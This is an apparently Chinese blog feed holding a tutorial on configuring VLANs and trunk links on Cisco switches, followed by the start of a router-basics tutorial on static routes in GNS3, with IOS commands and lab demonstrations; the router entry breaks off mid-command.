        <content type="html"><![CDATA[<p>这个主要用在交换机上</p><p>一台交换机默认情况下连接一个广播域，因为默认情况下所有的接口都是属于同一个vlan的，默认vlan1，所以是在同一个广播域中。</p><p>结合交换机的工作原理，数据来了之后，如果交换机上面的所有接口全部连着主机或者其他设备，那么交换机就会从所有的接口广播出去，造成广播域有点大，导致广播流量过多，这样会产生网络拥塞。</p><p>为了解决上述情况，就需要在交换机上划分广播域，使得一个交换机上存在多个广播域，这就是虚拟局域网VLAN</p><h2 id="一-目的"><a href="#一-目的" class="headerlink" title="一. 目的"></a>一. 目的</h2><h3 id="1-划分广播域"><a href="#1-划分广播域" class="headerlink" title="1. 划分广播域"></a>1. 划分广播域</h3><p>虚拟局域网VLAN的目的是为了划分广播域，不同广播域中的主机，是不能够进行通信的，如果想要通信，这时候需要借助路由</p><p>简单画个图看一下</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识1.webp" alt=""></p><p>这是一个交换机（黑色框），有8个接口（红色的），这些接口都属于一个广播域，默认VLAN1，并且都有设备连接。现在从左面设备传来了一个数据，通过交换机广播给了其余的7个接口所对应的设备。</p><p>我们设置虚拟VLAN后是这样的</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识2.webp" alt=""></p><p>这样就变成了两个广播域，从左面设备传来的数据只会在本广播域进行广播，控制了广播</p><h3 id="2-增强网络的安全性"><a href="#2-增强网络的安全性" class="headerlink" title="2. 增强网络的安全性"></a>2. 增强网络的安全性</h3><p>还是刚才的那个网络</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识3.webp" alt=""></p><p>现在主机A沦陷了，于是向交换机发了一个ARP广播，那么这个广播只会在本广播域内进行破坏，不会对另一个广播域内的设备产生影响。控制破坏范围，减小损失。</p><h3 id="3-简化了网络的管理"><a href="#3-简化了网络的管理" class="headerlink" title="3. 简化了网络的管理"></a>3. 简化了网络的管理</h3><p>由于我们划分了不同的广播域，网络的分区就特别的明显，使网络有条理。</p><p>比如说这个广播域给财务部用，这个广播域给销售部用，两个部门在两个广播域中，不会造成流量干扰。通信的话加一个路由就行</p><h2 id="二-VLAN种类"><a href="#二-VLAN种类" class="headerlink" title="二. VLAN种类"></a>二. VLAN种类</h2><p>VLAN分静态VLAN和动态VLAN</p><h3 id="1-静态VLAN"><a href="#1-静态VLAN" class="headerlink" title="1. 静态VLAN"></a>1. 静态VLAN</h3><p>基于端口划分的静态路由，需要管理员去配置，创建VLAN并将接口加入到VLAN</p><p>就像刚才举例的那样，把这些端口分到这个广播域，其他端口分配到其他的广播域。</p><h3 id="2-动态VLAN"><a href="#2-动态VLAN" class="headerlink" title="2. 动态VLAN"></a>2. 动态VLAN</h3><p>基于MAC地址自动将同一类型的MAC地址加入到同一VLAN</p><p>这种的比较少。我们举个例子</p><p>公司采购电脑通常是同一个厂商的电脑，比如说统一采购苹果的，这个是每个主机MAC地址的厂商编号是一样的。这个时候要去基于MAC地址进行配置动态VLAN的话就比较麻烦，还得去分电脑，很不方便</p><p>所以动态VLAN在实际使用场景中用的不是很多，不详细讲。</p><h2 id="三-静态VLAN"><a href="#三-静态VLAN" class="headerlink" title="三. 静态VLAN"></a>三. 静态VLAN</h2><h3 id="1-VLAN的范围"><a href="#1-VLAN的范围" class="headerlink" title="1. VLAN的范围"></a>1. VLAN的范围</h3><p>我们这个VLAN的范围分思科设备和华为设备，这两个会有不同，我们讲的是思科设备。</p><p>思科设备总计4096个VLAN：0~4095</p><p>0和4095是保留的，不用</p><p>默认VLAN是1</p><p>以太网VLAN是2~1001共1000个VLAN</p><p>扩展的以太网VLAN 1025~4094</p><h3 id="2-配置静态VLAN"><a href="#2-配置静态VLAN" class="headerlink" title="2. 配置静态VLAN"></a>2. 配置静态VLAN</h3><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="(1) 思路"></a>(1) 思路</h4><p>创建VLAN</p><p>将接口加入VLAN，这里需要指定接口的模式</p><h4 id="2-实验"><a href="#2-实验" class="headerlink" title="(2) 实验"></a>(2) 实验</h4><p>我们拿出一个交换机</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识4.webp" alt=""></p><p>这个交换机有24个快速以太网接口，两个千兆接口</p><p>这些接口默认在VLAN1中</p><p>我们现在想要将 f0/10接口加入到VLAN2，然后还要将20到24号接口加入到VLAN3</p><p>我们先要创建VLAN2和VLAN3，在全局模式下直接VLAN 2就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vlan 2  // 创建vlan2</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">vlan 3  // 创建vlan3</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识5.webp" alt=""></p><p>这样就创建好了。</p><p>还有一种不常用的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vlan databas  // 进入VLAN的数据库</span><br><span class="line"></span><br><span class="line">vlan 10  // 创建VLAN 10</span><br></pre></td></tr></table></figure><p>这个有的版本可能不好使。</p><p>那么我们怎么查看我们创建的广播域呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show vlan brief</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识6.webp" alt=""></p><p>可以看见有一个默认的vlan以及vlan2和vlan3，接口都在默认vlan中</p><p>我们现在需要把f0/10扔到vlan2中，20到24接口扔到vlan3中</p><h5 id="1、f0-10扔到vlan2中"><a href="#1、f0-10扔到vlan2中" class="headerlink" title="1、f0/10扔到vlan2中"></a>1、f0/10扔到vlan2中</h5><p>我们先进到f0/10接口中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int f0/10</span><br></pre></td></tr></table></figure><p>然后需要配置一下接口的模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">switchport mode access  // switchport是交换机 mode是模式 access代表接入接口</span><br><span class="line"></span><br><span class="line">这种access模式的接口一般用于连接客户机</span><br></pre></td></tr></table></figure><p>然后将接口加入到vlan2中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switchport access vlan 2</span><br></pre></td></tr></table></figure><p>这样就可以了，我们再show一下</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识7.webp" alt=""></p><p>这样就把f0/10接口加到vlan2中了。</p><h5 id="2、f0-20到f0-24扔到vlan3中"><a href="#2、f0-20到f0-24扔到vlan3中" class="headerlink" title="2、f0/20到f0/24扔到vlan3中"></a>2、f0/20到f0/24扔到vlan3中</h5><p>我们这里肯定不能一个一个加，这样能累死</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int range f0/20-24   // 进入这个接口范围 </span><br></pre></td></tr></table></figure><p>之后就和上面一样了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 3</span><br></pre></td></tr></table></figure><p>这样就行了，我们再show一下</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识8.webp" alt=""></p><p>这样就可以了</p><h5 id="3、通信演示"><a href="#3、通信演示" class="headerlink" title="3、通信演示"></a>3、通信演示</h5><p>现在还是那个交换机，加两个设备</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识9.webp" alt=""></p><p>PC0接在交换机的f0/2接口上，属于默认VLAN；PC1接在交换机的f0/20接口上，属于VLAN3。</p><p>我们给这两个设备设置IP</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识10.webp" alt=""></p><p>我们拿PC0 ping PC1，应该是ping不通的</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识11.webp" alt=""></p><p>我们可以看到，PC0去ping PC1的时候，在0秒的时候数据在PC0准备发送，在0.015秒的时候传到了PC1，然后在0.016的时候传到了PC1。</p><p>哎，我们看一下这个PC1</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识12.webp" alt=""></p><p>它告诉我们，这个设备没有接收到来自第二层的数据帧，因为广播地址不匹配。</p><p>在看看回应</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识13.webp" alt=""></p><p>可以看到ICMP协议，也就是ping，第二次出错了。</p><h4 id="3-其他操作"><a href="#3-其他操作" class="headerlink" title="(3) 其他操作"></a>(3) 其他操作</h4><p>我们上面讲了怎么创建，添加，查看VLAN，这里还有一些东西</p><p>比如查看特定的VLAN</p><p>我们查看vlan2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show vlan id 2</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识14.webp" alt=""></p><p>先创建一个vlan4，再把它删了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全局模式下创建vlan4</span><br><span class="line"></span><br><span class="line">vlan 4</span><br></pre></td></tr></table></figure><p>我们先看一下</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识15.webp" alt=""></p><p>有一个vlan4是吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">全局模式下</span><br><span class="line">no vlan 4  // 删除vlan4</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识16.webp" alt=""></p><p>可以看见vlan4没了。</p><h2 id="四-VLAN-trunk"><a href="#四-VLAN-trunk" class="headerlink" title="四. VLAN trunk"></a>四. VLAN trunk</h2><p>按照上述配置VLAN后有一个问题</p><p>这样的一个网络</p><p>![[临时图片/17.png]]</p><p>上面是VLAN 10，下面是VLAN 20</p><p>VLAN 10 有：PC0，PC1，交换机0的f0/1接口，交换机1的F0/2接口</p><p>VLAN 20 有：PC2，PC3，交换机0的f0/3接口，交换机1的F0/3接口</p><p>这两个交换机由一条线连着，那么有个问题</p><p>交换机0的f0/2接口和交换机1的f0/1接口是属于哪个VLAN</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识18.webp" alt=""></p><p><strong>VLAN trunk可以实现同一个VLAN跨交换机进行通信</strong>，所以交换机中间的链路我们要配置成VLAN 10可以过去，VLAN 20也可以过去</p><h3 id="1-目的"><a href="#1-目的" class="headerlink" title="1. 目的"></a>1. 目的</h3><p>实现<strong>相同VLAN</strong>跨交换机进行通信</p><p>就是上图中间那条线可以承载任何VLAN，这条链路叫做trunk链路</p><p>实现trunk链路需要去设置链路两段接口的模式</p><h3 id="2-交换机接口模式"><a href="#2-交换机接口模式" class="headerlink" title="2. 交换机接口模式"></a>2. 交换机接口模式</h3><h4 id="1-试结果"><a href="#1-试结果" class="headerlink" title="(1) 试结果"></a>(1) 试结果</h4><p>我们拿出一个交换机</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识19.webp" alt=""></p><p>我们看一下它f0/1接口的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show int f0/1 switchport</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识20.webp" alt=""></p><p>得到一堆信息，这些信息我在这篇文章讲过</p><p>他里头有一个这个东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrative Mode: dynamic auto  // 管理模式：动态自动</span><br></pre></td></tr></table></figure><p>这就是交换机的接口模式，交换机的所有接口默认是动态自动</p><p>这里还有一个这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Operational Mode: down  // 操作模式：down</span><br></pre></td></tr></table></figure><p>这个显示down，有因为我们现在还没有接主机，我们接一个试试</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识21.webp" alt=""></p><p>连上就变成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Operational Mode: static access  // 操作模式：静态访问</span><br></pre></td></tr></table></figure><p>说明现在是静态接入链路。</p><p>刚才是接入一个主机，那我们再接上一个交换机</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识22-1.webp" alt=""></p><p>交换机的默认管理模式是auto，连接设备的操作模式默认是静态访问</p><p>f0/2是动态自动，f0/1是动态自动，那么他们会协商出啥，理论上是动态自动</p><p>我们看一下交换机2的f0/2接口</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识23-1.webp" alt=""></p><p>可以发现，这个接着交换机的接口的模式和接着主机的接口模式一样，还是auto和access</p><p>我们可以得出一个结论</p><p><strong>交换机连接主机：协商出的结果access</strong></p><p><strong>交换机连接交换机：动态自动—————动态自动，操作模式协商结果是access</strong></p><p>那么有没有可能协商出别的东西</p><p>我们把交换机2的f0/2接口模式变成其他的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">switchport mode ?</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识24-1.webp" alt=""></p><p>可以看见有三个模式，access（静态直通），dynamic（动态）和trunk（分布式）</p><p>我们设置成动态，然后看看动态后面还有没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switchport mode dynamic ?</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识25-1.webp" alt=""></p><p>有动态自动和动态企望</p><p>我们设置为动态企望</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switchport mode dynamic desirable</span><br></pre></td></tr></table></figure><p>设置好后我们再show一下看看</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识26-1.webp" alt=""></p><p>可以看到，管理模式变成了动态企望，操作模式是trunk</p><p>所以我们可以再得出一个东西</p><p><strong>交换机连接交换机：动态自动—————动态企望，操作模式协商结果是trunk</strong></p><p>那么右面的呢的那台交换机3是啥样的</p><p>由于我们没设置，所以管理模式是动态自动，操作模式是协商出来的，所以交换机3的操作模式肯定是trunk</p><p>我们检查看一下</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识27-1.webp" alt=""></p><p>和我们想的一样.</p><p>我们再把交换机2的f0/2接口设置成access</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int f0/2 </span><br><span class="line">sw mo acc  // 可以缩写</span><br><span class="line">end</span><br><span class="line">show int f0/2 sw  //可以缩写</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识28-1.webp" alt=""></p><p>所以我们又得到了一个结果</p><p><strong>交换机连接交换机：动态自动—————access，操作模式协商结果是access</strong></p><p>其他的我就不演示了</p><h4 id="2-简单粗暴的方法"><a href="#2-简单粗暴的方法" class="headerlink" title="(2) 简单粗暴的方法"></a>(2) 简单粗暴的方法</h4><p>如果你记不住上面那些东西，可以直接这样</p><p>这个链路你要是想设置成trunk，直接两端口设置成trunk；想要设置成access直接两个端口都设置成access，啥协商不协商的，直接不管，接口设置成一样的就行了。</p><h3 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h3><p>现在一个网络</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识30.webp" alt=""></p><p>其中PC1和PC2属于VLAN 10；PC0和PC3属于VLAN 20</p><p>我们先分配一下VLAN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">交换机0：</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">exit</span><br><span class="line">vlan 20</span><br><span class="line">end</span><br><span class="line">show vlan brief  // 这里看一下创没创建好</span><br><span class="line">conf t</span><br><span class="line">int f0/1</span><br><span class="line">switchport access vlan 20  // 由于它默认就是access，所以我们可以不用格外的去设置接口模式</span><br><span class="line">(exit)  // 可加可不加</span><br><span class="line">int f0/3  // 这里不用退出，可以直接进入f0/3接口，但是这样容易看错，不建议</span><br><span class="line">switchport access vlan 10</span><br><span class="line">end</span><br><span class="line">show vlan brief</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识31.webp" alt=""></p><p>好了之后，同理去设置交换机1，下图是交换机1的</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识32.webp" alt=""></p><p>检查一下，现在VLAN 10有PC2和PC1；VLAN 20有PC0和PC3，分配成功</p><p>然后我们再针对那两个20号接口做一下设置</p><p>我们想要把中间两条链路变成trunk链路。</p><p>这里简单科普个东西：</p><p>我们中间的这个链路是可以让所有设备封装的数据帧通过。但是我们学交换机的时候，二层有两种数据帧封装方式，一个是E2，一个是802.3，而802.3是所有设备都可以用的，所以我们要让中间那条链路封装成802.3。</p><p>意思就是两个交换机不是同一个交换机，可能会发生这个交换机封装成E2，另一个却要用802.3的，所以要同一一下，如果是同一个交换机就不用管</p><p>我们再看一下接口信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show int f0/20 sw</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\虚拟局域网VLAN相关知识33.webp" alt=""></p><p>我们刚才说的东西就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrative Trunking Encapsulation: dot1q   // 管理中继封装：dot1q</span><br></pre></td></tr></table></figure><p>由于我们现在是两个相同的交换机，所以不用管这个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">交换机0</span><br><span class="line">int f0/20</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure><p>交换机0是trunk模式，交换机1是动态自动模式，根据那个表，协商出来的结果是trunk，所以交换机1根本不用管</p><p>然后我们分配一下IP，VLAN 10分配10网段，VLAN 20分配20网段</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识34.webp" alt=""></p><p>我们去ping一下</p><p>用PC0去ping PC3</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识35.webp" alt=""></p><p>可以发现能ping通</p><h3 id="4-trunk封装"><a href="#4-trunk封装" class="headerlink" title="4. trunk封装"></a>4. trunk封装</h3><p>我们上面讲了一个东西，就是不同交换机的话需要同一配置成802.3的帧，所以这里又有标准</p><h4 id="1-思科（ISL）"><a href="#1-思科（ISL）" class="headerlink" title="(1) 思科（ISL）"></a>(1) 思科（ISL）</h4><p>ISL是思科私有的帧格式</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识36.webp" alt=""></p><p>他就是在前面加了一个26字节的ISL头，在后面加了一个4字节的尾</p><h4 id="2-标准帧（802-3）"><a href="#2-标准帧（802-3）" class="headerlink" title="(2) 标准帧（802.3）"></a>(2) 标准帧（802.3）</h4><p>比如我们上面的那个dot1q，就是802.1q，主要是不同厂商交换机使用的共有标准</p><p><img src="\media\2023\01\虚拟局域网VLAN相关知识37.webp" alt=""></p><p>本来从左面设备来的是正常的以太网帧，到达第一个交换机后，他会发现这个是从VLAN 20来的，它就会会加一个4字节的802.1q的标记来标记他是VLAN 20的，然后通过中继链路传过去后，下一台交换机就会知道这是VLAN 20的数据，把标签拆掉，从VLAN 20的接口转发</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器基础相关知识</title>
      <link href="/2023/02/16/22/"/>
      <url>/2023/02/16/22/</url>
      
        <content type="html"><![CDATA[<h2 id="一-路由器工作原理"><a href="#一-路由器工作原理" class="headerlink" title="一. 路由器工作原理"></a>一. 路由器工作原理</h2><h3 id="1-什么是路由"><a href="#1-什么是路由" class="headerlink" title="1. 什么是路由"></a>1. 什么是路由</h3><p>从源主机到目标主机的转发过程（跨网络访问）</p><p>这里注意，是跨网络访问，因为不跨网络的话就是交换机网络了，没有网关，不需要路由器</p><h3 id="2-路由两个内容"><a href="#2-路由两个内容" class="headerlink" title="2. 路由两个内容"></a>2. 路由两个内容</h3><h4 id="1-确定最佳路径"><a href="#1-确定最佳路径" class="headerlink" title="(1) 确定最佳路径"></a>(1) 确定最佳路径</h4><p>假如我们现在想要从上海到北京，有很多条道。我可以做高铁，可以飞机，可以坐车去，我甚至可以先从上海到英国，再到美国，再从美国到北京，当然这就有点离谱了，虽然有很多条路，但是为了效率的话，肯定是会选一条最短的路。</p><p>这个确定最佳路径的过程就是路由</p><p>确定最佳路径的方式有两个，一个是手动指定，一个是根据动态路由协商方式。</p><p>手动指定好理解。动态路由协商就是说，有好几种动态路由方式，然后</p><h4 id="2-通过网络传输信息"><a href="#2-通过网络传输信息" class="headerlink" title="(2) 通过网络传输信息"></a>(2) 通过网络传输信息</h4><p>这个就是字面意思了</p><h3 id="3-路由器的工作原理"><a href="#3-路由器的工作原理" class="headerlink" title="3. 路由器的工作原理"></a>3. 路由器的工作原理</h3><p><img src="\media\2023\01\路由器基础相关知识1.webp" alt=""></p><h4 id="1-发送数据前要知道的东西"><a href="#1-发送数据前要知道的东西" class="headerlink" title="(1) 发送数据前要知道的东西"></a>(1) 发送数据前要知道的东西</h4><p>我们现在，主机A想要向主机B发送数据。主机A的IP地址是：192.168.10.1；主机B的IP地址是：192.168.10.254。主机A是在网络1中，主机B是在网络2中，所以这是一个跨网络的数据传输，所以需要用到路由器。</p><p>路由器是一个三层设备（网络层），使得两个不同的网络之间可以通信，那么路由器假如有两个接口的话，一个接口连接一个网络，导致两个端口的IP不同，就如上图展示一样。</p><p>路由器R1有两个接口分别是F0/0和F0/1，F0/0负责内网，所以它的IP地址和主机A在一个网段，F0/1负责对外，所以IP地址和内网不在一个网段。R2同理。</p><p>交换机有MAC表，路由器有路由表，功能和MAC表类似。如上图展示，F0/0接口负责对接192.168.10.0这个<strong>网段</strong>，F0/1负责对接192.168.50.0这个网段。</p><p>由于F0/0接口和主机A相连，那么主机A的网关就是192.168.10.254，同理主机B的网关是192.168.100.254</p><h4 id="2-开始发送数据"><a href="#2-开始发送数据" class="headerlink" title="(2) 开始发送数据"></a>(2) 开始发送数据</h4><p>主机A向主机B发送数据，源IP是192.168.10.1，目的IP是192.168.100.1。数据封装打包发给F0/0接口，R1看路由表发现F0/0可以对接数据包的源IP，但是没有可以对接目的IP的接口，于是它就会把这个包返回给主机A。</p><p>主机A一看数据包返回来了，这不行啊，于是它向路由表中添加条目，由于我们是向外发，所以添加的条目应该是F0/1接口的</p><p><img src="\media\2023\01\路由器基础相关知识2.webp" alt=""></p><p>这样F0/1接口就可以对接192.168.100.0网段了，主机A再把数据包发过去，就可以对接到F0/1接口，然后F0/1接口时负责向本网络外发送的，就会数据送出去。这时候源IP就变成了192.168.50.1</p><p>经过一系列的过程，到达网络2，首先是到达路由器R2，数据表的源IP网段有F0/1接口对接，数据通过F0/1进入，然后到F0/0接口发现目的IP的网段有接口对接，数据就会从F0/0进入网络2，然后到达主机B。这个过程还有一个重新封装的步骤，下面会讲</p><p>主机B收到数据后，会做一个回应，然后就是重复刚才的过程，看IP，找接口，没有就返回，再添加路由表，添加后再重新发……</p><h3 id="4-路由表"><a href="#4-路由表" class="headerlink" title="4. 路由表"></a>4. 路由表</h3><p>刚才我们说了一个路由表，这个表的数据有两种，直连路由和非直连路由</p><p>图中的192.168.10.0和192.168.50.0这两个网段就是R1的直连路由，直连路由说到底就是和路由器直接连接的IP，而192.168.100.0就是R1的非直连路由，是R2的直连路由。</p><p>直连路由是当路由器的接口配置好对应的IP地址并开启接口后自动生成的，非直连路由则是需要手动配置静态路由或者使用动态路由协议学习到。</p><h3 id="5-静态路由"><a href="#5-静态路由" class="headerlink" title="5. 静态路由"></a>5. 静态路由</h3><p>刚才又提到了一个静态路由</p><p>它由管理员手动配置，不灵活，而且是单向的。</p><p>特殊的静态路由（默认路由），比如说让数据到达任意地方。只有当在路由器的中找不到目标网络的路由条目时，才去查看默认路由</p><p>默认路由一般应用于末节(末梢) 网络(网络的最端) (路器的一端只连接了一个网络)</p><h3 id="6-动态路由"><a href="#6-动态路由" class="headerlink" title="6. 动态路由"></a>6. 动态路由</h3><p>既然有静态路由，那么就有动态路由</p><p>动态路由指的是通过某种动态路由协议自动的去建立自己路由表</p><p>常见的动态路由协议有：RIP，OSPE，IS-IS，BGP，IGRP，EIGRP等，我们主要讲RIP和OSPE</p><h2 id="二-路由器转发数据包的封装路程"><a href="#二-路由器转发数据包的封装路程" class="headerlink" title="二. 路由器转发数据包的封装路程"></a>二. 路由器转发数据包的封装路程</h2><p>我们这里使用GNS3模拟器演示</p><h3 id="1-设备需要及配置"><a href="#1-设备需要及配置" class="headerlink" title="1. 设备需要及配置"></a>1. 设备需要及配置</h3><p>先拿出4个路由器，其中两个路由器作为主机</p><p><img src="\media\2023\01\路由器基础相关知识3.webp" alt=""></p><p>我们把R3和R4的样式改成主机的，名字也改成PC1和PC2，配置接口</p><p>配置接口</p><p><img src="\media\2023\01\路由器基础相关知识4.webp" alt=""></p><p>改样式</p><p><img src="\media\2023\01\路由器基础相关知识5.webp" alt=""></p><p>改名</p><p><img src="\media\2023\01\路由器基础相关知识6.webp" alt=""></p><p>之后再给两个路由器配置接口，用几个模块就用几个接口，这里用了两个接口</p><p><img src="\media\2023\01\路由器基础相关知识7.webp" alt=""></p><p>R2同理</p><p>全部设置好之后再把他们连起来</p><p><img src="\media\2023\01\路由器基础相关知识8.webp" alt=""></p><p>这里有个这个东西</p><p><img src="\media\2023\01\路由器基础相关知识9.webp" alt=""></p><p>可以先把这个打开，这样就可以显示端口名称，像这样</p><p><img src="\media\2023\01\路由器基础相关知识10.webp" alt=""></p><p>全部设置连接好后，可以点击这个</p><p><img src="\media\2023\01\路由器基础相关知识11.webp" alt=""></p><p>这样就可以把设备开起来</p><p><img src="\media\2023\01\路由器基础相关知识12.webp" alt=""></p><p>接口变绿了说明没问题了</p><p>然后我们配置一下主机的IP</p><p>先说一下这个东西</p><p><img src="\media\2023\01\路由器基础相关知识13.webp" alt=""></p><p>它可以让我们在模拟器里打字，就像这样</p><p><img src="\media\2023\01\路由器基础相关知识14.webp" alt=""></p><p>起到了一个备注的效果，这里GW是网关。</p><p>在PC2下面也写一个</p><p><img src="\media\2023\01\路由器基础相关知识15.webp" alt=""></p><p>同理，路由器</p><p><img src="\media\2023\01\路由器基础相关知识16.webp" alt=""></p><p>然后就是真正的配置了，我们先配置路由器，双击就行，具体的和交换机一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">int f0/0  // 网关</span><br><span class="line">ip add 192.168.10.254 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">end</span><br><span class="line">conf t</span><br><span class="line">int f1/0</span><br><span class="line">ip add 192.168.5.1 255.255.255.0</span><br><span class="line">no shut</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\路由器基础相关知识17.webp" alt=""></p><p>R2同理</p><p>路由器完事配置PC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">int f0/0</span><br><span class="line">ip add 192.168.10.1 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">exit</span><br><span class="line">no ip routing  //把路由功能关掉，因为他是作为PC主机</span><br><span class="line">ip default-gateway 192.168.10.254  //配置PC网关</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\路由器基础相关知识18.webp" alt=""></p><p>PC2同理</p><p>现在的情况是，两个路由器在接口配置好后，会生成一个路由表。但是现在PC1向PC2传输数据时传不了的，因为路由表少条目，所以我们给路由表添加一个条目。</p><p>先配置R1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip route 192.168.100.0 255.255.255.0 fastEthernet 1/0</span><br><span class="line">// 192.168.100.0是目标主机所在的网段，255.255.255.0是子网掩码</span><br><span class="line">// fastEthernet 